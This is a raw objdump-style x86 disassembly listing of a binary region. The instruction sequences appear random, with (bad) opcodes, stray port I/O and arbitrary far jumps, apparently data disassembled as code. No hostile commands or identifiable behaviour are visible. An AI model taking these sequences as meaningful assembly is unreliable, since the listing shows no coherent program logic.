  41dd33:	or     al,0xab
  41dd35:	cmp    ebx,DWORD PTR [ebx+ecx*8+0x2530b7b2]
  41dd3c:	inc    ebp
  41dd3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd3e:	lock out 0x79,eax
  41dd41:	test   bh,bh
  41dd43:	repnz dec ebp
  41dd45:	test   cl,0xb
  41dd48:	ss into 
  41dd4a:	or     DWORD PTR [ebp-0x9],ebx
  41dd4d:	sub    al,0x17
  41dd4f:	mov    al,0x6e
  41dd51:	out    dx,eax
  41dd52:	push   ds
  41dd53:	arpl   WORD PTR [ecx],dx
  41dd55:	xor    eax,0x76df4670
  41dd5a:	mov    eax,DWORD PTR [ecx-0x1]
  41dd5d:	mov    ds:0x6ba4911b,eax
  41dd62:	inc    ecx
  41dd63:	mov    eax,DWORD PTR [esi]
  41dd65:	dec    esp
  41dd66:	mov    ebx,0x5188fecf
  41dd6b:	jbe    0x41dcf8
  41dd6d:	jns    0x41ddb8
  41dd6f:	fcmovnb st,st(0)
  41dd71:	cld    
  41dd72:	pop    ds
  41dd73:	jecxz  0x41ddbc
  41dd75:	and    edi,0xffffffc4
  41dd78:	dec    edi
  41dd79:	push   ecx
  41dd7a:	xchg   bh,dl
  41dd7c:	not    DWORD PTR [ebp+edi*1-0x707c29ec]
  41dd83:	dec    ecx
  41dd84:	xchg   edx,eax
  41dd85:	daa    
  41dd86:	and    BYTE PTR [ecx+0x22],dh
  41dd89:	ror    DWORD PTR [edx+0x679c8a9],cl
  41dd8f:	cmc    
  41dd90:	xchg   edi,eax
	...
  41ddf1:	add    BYTE PTR [eax],al
  41ddf3:	add    BYTE PTR [eax],ah
  41ddf5:	repz das 
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	mov    ebp,0xee0379f3
  41de05:	cmp    eax,0x1050001
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	sbb    eax,0xb25ef363
  41de11:	sbb    al,0xec
  41de13:	test   eax,0x9694fabe
  41de18:	faddp  st(7),st
  41de1a:	shl    cl,1
  41de1c:	pop    eax
  41de1d:	push   es
  41de1e:	lods   al,BYTE PTR ds:[esi]
  41de1f:	shl    DWORD PTR [esi+0x47],0x97
  41de23:	mov    BYTE PTR [ecx+0x71af1a5a],dl
  41de29:	stos   BYTE PTR es:[edi],al
  41de2a:	sbb    al,0x58
  41de2c:	call   0xbaef88a5
  41de31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de32:	jbe    0x41dddc
  41de34:	data16 mov al,ds:0x1b5d836e
  41de3a:	add    al,0x3a
  41de3c:	inc    ecx
  41de3d:	mov    bh,0xba
  41de3f:	push   eax
  41de40:	ret    
  41de41:	stos   DWORD PTR es:[edi],eax
  41de42:	leave  
  41de43:	in     eax,dx
  41de44:	pop    eax
  41de45:	add    eax,esp
  41de47:	xchg   esi,eax
  41de48:	cmp    eax,0x141aed48
  41de4d:	add    al,BYTE PTR [esi+edx*8+0x648ba524]
  41de54:	ja     0x41de61
  41de56:	add    DWORD PTR [ebp+0x2],0x61
  41de5a:	test   al,0x43
  41de5c:	add    eax,0x1b01ef44
  41de61:	sub    eax,0x227b4136
  41de66:	or     al,0x50
  41de68:	mov    esi,0xb78c3ba8
  41de6d:	clc    
  41de6e:	mov    bh,0x2a
  41de70:	cs cmc 
  41de72:	adc    eax,0x3c1eaa09
  41de77:	mov    al,0x68
  41de79:	test   DWORD PTR [ebp+0x75],edi
  41de7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de7d:	dec    edx
  41de7e:	rcl    DWORD PTR [ecx],cl
  41de80:	fisttp DWORD PTR [eax]
  41de82:	aaa    
  41de83:	xor    eax,0xe9f750f3
  41de88:	icebp  
  41de89:	pop    ebx
  41de8a:	sbb    eax,0x6330fbda
  41de8f:	dec    ebp
  41de90:	jp     0x41dee2
  41de92:	popf   
  41de93:	ret    
  41de94:	outs   dx,BYTE PTR ds:[esi]
  41de95:	mov    al,BYTE PTR [edi+0x35c9cd19]
  41de9b:	into   
  41de9c:	dec    esi
  41de9d:	pop    es
  41de9e:	and    DWORD PTR [ecx+eiz*1],0x36
  41dea2:	fild   DWORD PTR [edi-0x79]
  41dea5:	addr16 dec eax
  41dea7:	pop    ecx
  41dea8:	sub    eax,0xd405ce92
  41dead:	jg     0x41de77
  41deaf:	add    BYTE PTR [eax],bl
  41deb1:	loop   0x41deee
  41deb3:	pop    esp
  41deb4:	and    BYTE PTR [ecx],0xda
  41deb7:	ret    
  41deb8:	add    al,0xce
  41deba:	int    0x8e
  41debc:	xor    BYTE PTR [ecx+0x7e],ch
  41debf:	adc    al,0xc
  41dec1:	or     BYTE PTR [ebx-0x5e],dl
  41dec4:	jp     0x41df3a
  41dec6:	ret    
  41dec7:	adc    al,0xd
  41dec9:	lock mov bl,0x82
  41decc:	xor    al,0x4
  41dece:	lods   al,BYTE PTR ds:[esi]
  41decf:	ret    0xaf6c
  41ded2:	aam    0x57
  41ded4:	loope  0x41defd
  41ded6:	pop    ecx
  41ded7:	pop    esi
  41ded8:	inc    BYTE PTR [ebx+0x3d]
  41dedb:	jne    0x41dec9
  41dedd:	rol    BYTE PTR [edx+0x3e5cf3d2],cl
  41dee3:	sub    BYTE PTR cs:[ebp+0x16],bl
  41dee7:	fisttp DWORD PTR [ecx+0x1064df47]
  41deed:	mov    edi,0x666ecf50
  41def2:	sub    BYTE PTR [ecx-0x7e801cda],bl
  41def8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41def9:	(bad)  
  41defa:	out    dx,al
  41defb:	cmp    edi,DWORD PTR [esi]
  41defd:	out    0x54,eax
  41deff:	clc    
  41df00:	push   0xffffff92
  41df02:	pusha  
  41df03:	test   BYTE PTR [eax-0x12],dl
  41df06:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df08:	neg    ch
  41df0a:	fstp   DWORD PTR [edi]
  41df0c:	xchg   ebx,edi
  41df0e:	in     al,0xf7
  41df10:	pop    esi
	...
  41df71:	add    BYTE PTR [eax],al
  41df73:	add    BYTE PTR [edi],bh
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0x862b9ce9
  41df82:	out    dx,eax
  41df83:	mov    dh,0xf3
  41df85:	add    DWORD PTR ds:[eax],eax
  41df88:	add    eax,0xa000001
  41df8d:	(bad)  [ebx+0x1b]
  41df90:	jmp    0x6d85:0x888cdf98
  41df97:	sub    edi,DWORD PTR [esi+0x2121a868]
  41df9d:	xchg   edi,eax
  41df9e:	add    ebp,edi
  41dfa0:	adc    eax,0x981c3f63
  41dfa5:	push   ss
  41dfa6:	repnz out 0x56,al
  41dfa9:	cld    
  41dfaa:	or     al,0x85
  41dfac:	mov    cl,0x37
  41dfae:	nop
  41dfaf:	test   DWORD PTR [edi+edi*4],ebp
  41dfb2:	add    esi,ebp
  41dfb4:	cmp    DWORD PTR [eax-0x3d97cbfd],ebx
  41dfba:	stos   DWORD PTR es:[edi],eax
  41dfbb:	inc    eax
  41dfbc:	ins    BYTE PTR es:[edi],dx
  41dfbd:	hlt    
  41dfbe:	sub    eax,0xd06a7dfa
  41dfc3:	add    edi,DWORD PTR [edx]
  41dfc5:	xchg   ecx,eax
  41dfc6:	xor    eax,0x9e496640
  41dfcb:	fs jge 0x41df86
  41dfce:	xchg   esi,eax
  41dfcf:	sub    al,0xff
  41dfd1:	adc    al,0x57
  41dfd3:	aas    
  41dfd4:	pop    ecx
  41dfd5:	xchg   esi,eax
  41dfd6:	dec    edx
  41dfd7:	adc    ebp,ebp
  41dfd9:	jp     0x41df81
  41dfdb:	mov    cl,0xd7
  41dfdd:	xchg   esi,eax
  41dfde:	add    bh,BYTE PTR [ebp-0x7c]
  41dfe1:	fistp  DWORD PTR [ebp-0x74]
  41dfe4:	jae    0x41dfad
  41dfe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfe7:	sbb    esp,DWORD PTR [esi]
  41dfe9:	js     0x41e02f
  41dfeb:	dec    esp
  41dfec:	mov    eax,ds:0x467bc63b
  41dff1:	dec    edx
  41dff2:	adc    eax,DWORD PTR ss:[ebp+0x40884ea9]
  41dff9:	inc    ebp
  41dffa:	imul   ebp,DWORD PTR [esi-0x7b],0xfffffffa
  41dffe:	cs jbe 0x41e022
  41e001:	or     BYTE PTR [edi-0x16],0x2d
  41e005:	lea    esp,[ecx+esi*8-0x48]
  41e009:	mov    al,0x6d
  41e00b:	mov    al,0xbc
  41e00d:	sahf   
  41e00e:	mov    esp,0x79865acd
  41e013:	jmp    0x41dff8
  41e015:	cmp    ebx,DWORD PTR [ecx+0x2cd5a2cb]
  41e01b:	fadd   DWORD PTR [esi-0x159436a2]
  41e021:	jne    0x41e04d
  41e023:	mov    ecx,0x466e49ad
  41e028:	xchg   ecx,eax
  41e029:	sub    bl,BYTE PTR [ecx-0x2cb241c6]
  41e02f:	sahf   
  41e030:	sub    ah,ah
  41e032:	(bad)  
  41e033:	fsubrp st(1),st
  41e035:	ret    0xf783
  41e038:	mov    eax,0x499f8d0f
  41e03d:	xor    eax,DWORD PTR [ecx+0xb]
  41e040:	or     edx,esp
  41e042:	push   ss
  41e043:	sbb    eax,0x97de5ae2
  41e048:	retf   0x659d
  41e04b:	stos   BYTE PTR es:[edi],al
  41e04c:	aad    0xb9
  41e04e:	push   esp
  41e04f:	push   ecx
  41e050:	ret    
  41e051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e052:	jmp    0x71e9:0x3aa35512
  41e059:	js     0x41dfed
  41e05b:	jmp    DWORD PTR [ebx]
  41e05d:	ins    BYTE PTR es:[edi],dx
  41e05e:	popa   
  41e05f:	or     al,BYTE PTR [ecx+0x79ef1f90]
  41e065:	inc    ebx
  41e066:	div    BYTE PTR [ecx]
  41e068:	xchg   BYTE PTR [eax-0x61f06405],ch
  41e06e:	mov    dl,0xcc
  41e070:	mov    edi,0xe709c973
  41e075:	mov    ah,0x2a
  41e077:	push   esp
  41e078:	jle    0x41e01a
  41e07a:	jg     0x41e0b0
  41e07c:	scas   al,BYTE PTR es:[edi]
  41e07d:	mov    ds:0xc4bcc97d,eax
  41e082:	aaa    
  41e083:	inc    edi
  41e084:	in     al,dx
  41e085:	inc    edx
  41e086:	push   ebp
  41e087:	out    0x7d,al
  41e089:	jg     0x41e0a2
  41e08b:	push   0x36
  41e08d:	xlat   BYTE PTR ds:[ebx]
  41e08e:	dec    eax
  41e08f:	out    0xed,eax
	...
  41e0f1:	add    BYTE PTR [eax],al
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	mov    ah,0x6
  41e102:	jb     0x41e0db
  41e104:	clc    
  41e105:	aas    
  41e106:	add    DWORD PTR [eax],eax
  41e108:	add    eax,0x25000001
  41e10d:	imul   ebx
  41e10f:	add    ebx,ebx
  41e111:	and    ebx,ebx
  41e113:	cdq    
  41e114:	mov    ds:0x40f6df04,al
  41e119:	ins    BYTE PTR es:[edi],dx
  41e11a:	push   edx
  41e11b:	stos   BYTE PTR es:[edi],al
  41e11c:	aas    
  41e11d:	push   cs
  41e11e:	xlat   BYTE PTR ds:[ebx]
  41e11f:	sar    ah,0xfc
  41e122:	sbb    esi,ecx
  41e124:	push   cs
  41e125:	and    ah,BYTE PTR [edi]
  41e127:	icebp  
  41e128:	out    dx,al
  41e129:	(bad)  
  41e12a:	shl    BYTE PTR [eax],cl
  41e12c:	pushf  
  41e12d:	xor    eax,0xf9aa555a
  41e132:	xchg   ecx,eax
  41e133:	test   al,0x6e
  41e135:	out    dx,al
  41e136:	ficomp WORD PTR [eax+0x115a4adf]
  41e13c:	xchg   DWORD PTR [edi],edx
  41e13e:	data16 into 
  41e140:	ret    0xe84a
  41e143:	jle    0x41e1b8
  41e145:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e146:	inc    ecx
  41e147:	rcr    ch,0x51
  41e14a:	and    al,0x62
  41e14c:	mov    eax,edx
  41e14e:	fbstp  TBYTE PTR [edx-0x644d9b86]
  41e154:	cmp    ebp,DWORD PTR [edi+0x21268fde]
  41e15a:	dec    esp
  41e15b:	jae    0x41e10c
  41e15d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e15e:	call   0x8e0641f0
  41e163:	sbb    BYTE PTR [ebx+eiz*1+0x6b],dl
  41e167:	mov    al,0x2c
  41e169:	std    
  41e16a:	clc    
  41e16b:	retf   
  41e16c:	arpl   WORD PTR [eax],ax
  41e16e:	test   DWORD PTR [edx+0x1c88d10e],eax
  41e174:	inc    edx
  41e175:	or     ebx,ebx
  41e177:	test   al,0xf5
  41e179:	int3   
  41e17a:	xchg   edi,eax
  41e17b:	out    0x38,eax
  41e17d:	or     DWORD PTR [edi+0x34],edi
  41e180:	fisttp WORD PTR ds:0x1f33b22f
  41e186:	mov    ch,0xa9
  41e188:	dec    edx
  41e189:	push   ebx
  41e18a:	scas   al,BYTE PTR es:[edi]
  41e18b:	mov    esi,0x1d9c253c
  41e190:	test   BYTE PTR [eax-0x4113ba00],bl
  41e196:	pop    esi
  41e197:	aam    0x9d
  41e199:	shl    DWORD PTR [edi],1
  41e19b:	addr16 in al,dx
  41e19d:	cmp    eax,0x7dae1e8d
  41e1a2:	push   esp
  41e1a3:	mov    ecx,cs
  41e1a5:	ins    BYTE PTR es:[edi],dx
  41e1a6:	lods   eax,DWORD PTR ds:[esi]
  41e1a7:	fadd   st(2),st
  41e1a9:	jl     0x41e199
  41e1ab:	or     bl,bh
  41e1ad:	push   ebp
  41e1ae:	mov    bl,0x95
  41e1b0:	aaa    
  41e1b1:	loope  0x41e1b1
  41e1b3:	loope  0x41e140
  41e1b5:	sbb    eax,0x520b3253
  41e1ba:	push   ebx
  41e1bb:	push   ss
  41e1bc:	mov    ebp,0x6d4ec56c
  41e1c1:	xchg   esi,eax
  41e1c2:	iret   
  41e1c3:	push   ss
  41e1c4:	leave  
  41e1c5:	push   es
  41e1c6:	mov    al,0x39
  41e1c8:	(bad)  
  41e1c9:	push   esp
  41e1ca:	inc    esi
  41e1cb:	sub    edx,ecx
  41e1cd:	imul   ecx,DWORD PTR [edx+0x9],0x47fddfac
  41e1d4:	das    
  41e1d5:	adc    al,0x88
  41e1d7:	adc    edx,DWORD PTR [ecx]
  41e1d9:	push   esp
  41e1da:	retf   
  41e1db:	inc    ecx
  41e1dc:	test   DWORD PTR [edi-0x48],eax
  41e1df:	add    eax,0xf1e9a943
  41e1e4:	stos   DWORD PTR es:[edi],eax
  41e1e5:	jmp    0xc424:0x3c13bc66
  41e1ec:	push   0x7461cca8
  41e1f1:	jg     0x41e20e
  41e1f3:	cmp    al,0xb9
  41e1f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1f6:	rcl    edi,0x1b
  41e1f9:	pop    es
  41e1fa:	mov    esi,0x106045dd
  41e1ff:	xchg   edi,eax
  41e200:	iret   
  41e201:	xchg   ecx,eax
  41e202:	pop    ecx
  41e203:	std    
  41e204:	in     al,0x93
  41e206:	into   
  41e207:	out    0x7e,al
  41e209:	jmp    0xd2a8:0x881245be
  41e210:	mov    esp,0x0
	...
  41e271:	add    BYTE PTR [eax],al
  41e273:	add    BYTE PTR [ebx-0x1988fe],ch
  41e279:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e27f:	or     al,0xd9
  41e281:	and    esp,DWORD PTR [eax]
  41e283:	data16 std 
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    eax,0x84000001
  41e28d:	scas   eax,DWORD PTR es:[edi]
  41e28e:	or     ebx,DWORD PTR [ebp-0x7b]
  41e291:	in     al,0x3e
  41e293:	cmp    DWORD PTR [eax+0x42],esp
  41e296:	adc    al,0xaa
  41e298:	inc    ecx
  41e299:	mov    esi,0x9694976a
  41e29e:	popa   
  41e29f:	xor    al,BYTE PTR [ecx+0x6a]
  41e2a2:	out    dx,eax
  41e2a3:	jle    0x41e2fb
  41e2a5:	xchg   esi,eax
  41e2a6:	jg     0x41e2b0
  41e2a8:	les    esp,FWORD PTR [ebx+0x4526aa6b]
  41e2ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2af:	push   es
  41e2b0:	lock and DWORD PTR [ebp+0x4f3f7726],ecx
  41e2b7:	imul   DWORD PTR [esi]
  41e2b9:	add    ecx,DWORD PTR [eax-0x77]
  41e2bc:	fcom   QWORD PTR [ecx-0x6fda3fbf]
  41e2c2:	int    0xa2
  41e2c4:	adc    DWORD PTR [eax],0x78874158
  41e2ca:	retf   
  41e2cb:	jbe    0x41e33d
  41e2cd:	pop    esi
  41e2ce:	clc    
  41e2cf:	add    bh,BYTE PTR [ebx]
  41e2d1:	fwait
  41e2d2:	or     ebx,edx
  41e2d4:	mov    DWORD PTR [eax+0x4da3cbc9],ebx
  41e2da:	shl    DWORD PTR [ebx-0x33],1
  41e2dd:	push   ebp
  41e2de:	repz cmp ch,BYTE PTR [esi+0x23]
  41e2e2:	sbb    al,0x2d
  41e2e4:	mov    ebx,0x64ce1e04
  41e2e9:	(bad)  
  41e2ea:	push   esp
  41e2eb:	mov    eax,ds:0x3b186ef9
  41e2f0:	loope  0x41e2b0
  41e2f2:	push   ds
  41e2f3:	adc    esi,DWORD PTR [ebx+ecx*1+0xef00de3]
  41e2fa:	push   ebx
  41e2fb:	add    eax,0x93634d5c
  41e300:	cmp    esp,eax
  41e302:	ret    
  41e303:	cmp    ebp,DWORD PTR [ebp-0x7]
  41e306:	outs   dx,DWORD PTR ds:[esi]
  41e307:	adc    al,0xa
  41e309:	and    eax,0x3d4b2584
  41e30e:	shl    eax,cl
  41e310:	xor    al,0xd
  41e312:	repz push DWORD PTR [ebp+0xecbe213]
  41e319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e31a:	(bad)  
  41e31b:	sbb    cl,BYTE PTR [edx-0x298dcbac]
  41e321:	jmp    FWORD PTR [ebp-0x62]
  41e324:	(bad)  
  41e325:	(bad)  [ebx+0x6c969aad]
  41e32b:	idiv   DWORD PTR [edi+0x1f291701]
  41e331:	ins    BYTE PTR es:[edi],dx
  41e332:	sbb    eax,DWORD PTR [eax]
  41e334:	dec    esi
  41e335:	push   0xc8ae9fde
  41e33a:	(bad)  [eax-0x4f]
  41e33d:	jno    0x41e33f
  41e33f:	retf   
  41e340:	loop   0x41e361
  41e342:	mov    ds:0x7dc7cf6a,eax
  41e347:	or     dl,BYTE PTR [ecx-0x2d01bcf]
  41e34d:	mov    ebx,0xd00381e
  41e352:	mov    al,0x1c
  41e354:	pop    ds
  41e355:	in     eax,dx
  41e356:	cmp    BYTE PTR [edi-0x7eb9a2ba],dl
  41e35c:	call   0xdcfc:0xcedc52b1
  41e363:	pop    es
  41e364:	(bad)  
  41e365:	popa   
  41e366:	arpl   ax,bp
  41e368:	in     eax,dx
  41e369:	sbb    DWORD PTR [ebp+eax*2+0x5c037de1],0x36
  41e371:	pusha  
  41e372:	enter  0xd070,0x9
  41e376:	cmp    esp,ecx
  41e378:	ret    
  41e379:	bound  edi,QWORD PTR [eax-0x26]
  41e37c:	and    al,0xff
  41e37e:	call   0x1f07:0x2ed06cb6
  41e385:	ja     0x41e33a
  41e387:	xchg   BYTE PTR [eax+edx*1],ah
  41e38a:	push   ebx
  41e38b:	cmp    bh,BYTE PTR [eax+0x6]
  41e38e:	sti    
  41e38f:	out    0xa6,eax
	...
  41e3f1:	add    BYTE PTR [eax],al
  41e3f3:	add    BYTE PTR [ecx-0xe088ee],cl
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x92764909
  41e403:	in     al,dx
  41e404:	add    al,BYTE PTR [edx+0x1]
  41e407:	add    BYTE PTR ds:0x6d000001,al
  41e40d:	(bad)  
  41e40e:	ja     0x41e3fa
  41e410:	in     al,dx
  41e411:	in     al,dx
  41e412:	push   ebx
  41e413:	sbb    ecx,ecx
  41e415:	xchg   esp,eax
  41e416:	dec    ebx
  41e417:	sub    eax,0xfac6aca4
  41e41c:	xchg   edx,eax
  41e41d:	cmp    dh,ch
  41e41f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e420:	mov    BYTE PTR [esi-0x4e276ae1],ch
  41e426:	pop    edi
  41e427:	pusha  
  41e428:	jo     0x41e450
  41e42a:	fnstenv [edx]
  41e42c:	push   ebx
  41e42d:	push   ss
  41e42e:	dec    eax
  41e42f:	cmp    al,0xa0
  41e431:	fsubrp st(7),st
  41e433:	dec    eax
  41e434:	mov    edi,0xc5b66fb3
  41e439:	jp     0x41e483
  41e43b:	lods   al,BYTE PTR ds:[esi]
  41e43c:	mov    edx,0x66271043
  41e441:	mov    ebx,ebx
  41e443:	or     BYTE PTR [ecx+esi*4-0x2e6c4899],ah
  41e44a:	sub    dh,dh
  41e44c:	(bad)  
  41e44d:	xor    dh,BYTE PTR [ebx+0x4affc8c3]
  41e453:	push   es
  41e454:	add    cl,BYTE PTR [ebp+0x15]
  41e457:	hlt    
  41e458:	jb     0x41e3e6
  41e45a:	jg     0x41e49c
  41e45c:	test   eax,0x4fefde16
  41e461:	ror    bl,1
  41e463:	mov    ds:0x96fb9466,al
  41e468:	fisub  WORD PTR [eax]
  41e46a:	dec    esi
  41e46b:	in     al,dx
  41e46c:	and    ebp,DWORD PTR [edi+0x61959065]
  41e472:	push   es
  41e473:	div    esp
  41e475:	fidiv  WORD PTR [esp+ebp*1+0xb94f20b]
  41e47c:	das    
  41e47d:	adc    DWORD PTR [edx],0x8ae0f5f
  41e483:	leave  
  41e484:	mov    dh,0x46
  41e486:	xlat   BYTE PTR ds:[ebx]
  41e487:	push   cs
  41e488:	or     ch,BYTE PTR [esi+0x3f020a69]
  41e48e:	or     bl,ch
  41e490:	mov    ebp,0xc6e67cee
  41e495:	not    DWORD PTR ds:0xa86316c8
  41e49b:	and    dl,BYTE PTR [edi]
  41e49d:	cld    
  41e49e:	jl     0x41e436
  41e4a0:	and    BYTE PTR [edx+edi*8],al
  41e4a3:	xlat   BYTE PTR ds:[ebx]
  41e4a4:	in     al,dx
  41e4a5:	sahf   
  41e4a6:	and    dl,BYTE PTR ds:0x23285316
  41e4ac:	pop    ebx
  41e4ad:	mov    bl,0x8c
  41e4af:	mov    cs,WORD PTR [esi-0x1]
  41e4b2:	xchg   ecx,eax
  41e4b3:	jmp    0x7c8a4b08
  41e4b8:	fdivr  QWORD PTR [edi+ebp*8]
  41e4bb:	jne    0x41e444
  41e4bd:	or     dl,cl
  41e4bf:	sbb    dl,BYTE PTR [eax-0x37cd299d]
  41e4c5:	fld    TBYTE PTR [edi]
  41e4c7:	xor    dl,dh
  41e4c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4ca:	clc    
  41e4cb:	mov    ch,0x80
  41e4cd:	mov    bl,0x26
  41e4cf:	cwde   
  41e4d0:	dec    ebp
  41e4d1:	add    DWORD PTR [ecx+0x52],eax
  41e4d4:	xor    BYTE PTR [eax-0x113502d8],bh
  41e4da:	dec    eax
  41e4db:	in     al,0x5c
  41e4dd:	fsubr  DWORD PTR [ecx]
  41e4df:	lock inc ebp
  41e4e1:	das    
  41e4e2:	fld    TBYTE PTR [eax+0x5f93ce18]
  41e4e8:	call   0xd1366777
  41e4ed:	and    eax,0xc05c6a76
  41e4f2:	hlt    
  41e4f3:	xor    BYTE PTR [edx],bl
  41e4f5:	and    eax,0x6f0106ad
  41e4fa:	inc    esp
  41e4fb:	xchg   ecx,eax
  41e4fc:	shr    BYTE PTR [edi-0x35],0x81
  41e500:	jnp    0x41e4dc
  41e502:	mov    eax,0xf6c5e573
  41e507:	lea    esp,[esi+esi*1-0x12]
  41e50b:	out    0x83,eax
  41e50d:	fadd   st,st(6)
  41e50f:	xchg   ecx,eax
  41e510:	push   esp
	...
  41e571:	add    BYTE PTR [eax],al
  41e573:	add    BYTE PTR [eax],ah
  41e575:	push   0xffffffcb
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e553
  41e581:	nop
  41e582:	out    dx,al
  41e583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e584:	pop    es
  41e585:	inc    ebx
  41e586:	add    DWORD PTR [eax],eax
  41e588:	add    eax,0xd1000001
  41e58d:	xor    eax,0xf6a14c84
  41e592:	or     al,0xa7
  41e594:	xchg   ebp,eax
  41e595:	push   ecx
  41e596:	pop    DWORD PTR gs:[edx]
  41e599:	stos   DWORD PTR es:[edi],eax
  41e59a:	in     al,dx
  41e59b:	inc    esp
  41e59c:	jae    0x41e5e3
  41e59e:	test   al,0xf4
  41e5a0:	jmp    0x41e5c5
  41e5a2:	les    edi,FWORD PTR [ecx+0x79c40549]
  41e5a8:	mov    dl,0xd8
  41e5aa:	dec    esp
  41e5ab:	scas   eax,DWORD PTR es:[edi]
  41e5ac:	jecxz  0x41e5eb
  41e5ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5af:	dec    esi
  41e5b0:	add    DWORD PTR [edi+edi*1],ebx
  41e5b3:	jl     0x41e5eb
  41e5b5:	sub    eax,0xb39a5ee3
  41e5ba:	mov    edx,DWORD PTR [ebp-0x7399152a]
  41e5c0:	sbb    BYTE PTR [esi+0x66],ah
  41e5c3:	xchg   ebp,eax
  41e5c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5c5:	imul   cl
  41e5c7:	fadd   st(7),st
  41e5c9:	xchg   ebx,eax
  41e5ca:	xor    eax,0x5d73a08
  41e5cf:	into   
  41e5d0:	push   ecx
  41e5d1:	int3   
  41e5d2:	xor    BYTE PTR [ebp-0x9],0xd3
  41e5d6:	push   edi
  41e5d7:	mov    esi,0x7ff3f3d7
  41e5dc:	mov    dl,0x2b
  41e5de:	cmp    DWORD PTR [eax-0x46c3838c],eax
  41e5e4:	mov    ecx,0xea7f8e11
  41e5e9:	inc    ecx
  41e5ea:	mov    ecx,DWORD PTR [ebp+0x2782cffd]
  41e5f0:	push   0xffffffd9
  41e5f2:	lea    eax,[ebx-0x78]
  41e5f5:	aad    0x48
  41e5f7:	stc    
  41e5f8:	mov    DWORD PTR [esi+esi*2+0x4a],eax
  41e5fc:	scas   al,BYTE PTR es:[edi]
  41e5fd:	lods   al,BYTE PTR ds:[esi]
  41e5fe:	sbb    DWORD PTR [edx],esi
  41e600:	test   al,0x85
  41e602:	jmp    0x41e606
  41e604:	mov    cl,0xec
  41e606:	pushf  
  41e607:	pop    ebx
  41e608:	and    DWORD PTR [ecx],0x2ebafe60
  41e60e:	mov    ds:0x405fa662,al
  41e613:	sbb    al,0xe
  41e615:	nop
  41e616:	push   ebp
  41e617:	xchg   ecx,eax
  41e618:	test   DWORD PTR [ebp+ebp*4-0x11],eax
  41e61c:	push   esp
  41e61d:	dec    eax
  41e61e:	xor    eax,0x9aedb16d
  41e623:	push   ebx
  41e624:	xlat   BYTE PTR ds:[ebx]
  41e625:	dec    ebp
  41e626:	test   al,0xc8
  41e628:	push   ds
  41e629:	add    dl,BYTE PTR ds:[eax+eiz*1]
  41e62d:	push   esi
  41e62e:	idiv   DWORD PTR [esi]
  41e630:	mov    dh,0x12
  41e632:	mov    ah,0x59
  41e634:	sbb    ecx,DWORD PTR [eax]
  41e636:	fmul   QWORD PTR ds:0x8c1fd237
  41e63c:	sbb    al,0x54
  41e63e:	nop
  41e63f:	push   es
  41e640:	mov    ds:0xae57a796,eax
  41e645:	retfw  
  41e647:	mov    bh,0x9a
  41e649:	es test al,0xa2
  41e64c:	pop    esp
  41e64d:	loop   0x41e5fc
  41e64f:	out    dx,eax
  41e650:	retf   0x979a
  41e653:	cmp    edx,0xfffffff8
  41e656:	cmc    
  41e657:	shl    WORD PTR [ecx],cl
  41e65a:	in     eax,0x71
  41e65c:	pop    ebx
  41e65d:	dec    esi
  41e65e:	jbe    0x41e675
  41e660:	ss xor edx,edx
  41e663:	ror    DWORD PTR [ebp+eax*2-0x5bfd016b],1
  41e66a:	mov    ah,0x3f
  41e66c:	inc    ebp
  41e66d:	jmp    edi
  41e66f:	adc    dh,al
  41e671:	ins    DWORD PTR es:[edi],dx
  41e672:	aaa    
  41e673:	pop    edi
  41e674:	lods   eax,DWORD PTR ds:[esi]
  41e675:	mov    ecx,0x11f914ca
  41e67a:	sbb    eax,DWORD PTR [ecx]
  41e67c:	shr    ah,0x77
  41e67f:	and    BYTE PTR [ebp+0x6cadeff0],bh
  41e685:	out    0xa5,eax
  41e687:	xchg   edx,eax
  41e688:	jne    0x41e6e8
  41e68a:	mov    eax,DWORD PTR [eax]
  41e68c:	dec    ebp
  41e68d:	ficomp WORD PTR [edi]
  41e68f:	adc    bh,BYTE PTR [eax]
	...
  41e6f1:	add    BYTE PTR [eax],al
  41e6f3:	add    ch,al
  41e6f5:	cwde   
  41e6f6:	loope  0x41e74d
  41e6f8:	std    
  41e6f9:	jge    0x41e6f0
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    edx,DWORD PTR [edi]
  41e701:	nop
  41e702:	sahf   
  41e703:	cld    
  41e704:	or     al,0x44
  41e706:	add    DWORD PTR [eax],eax
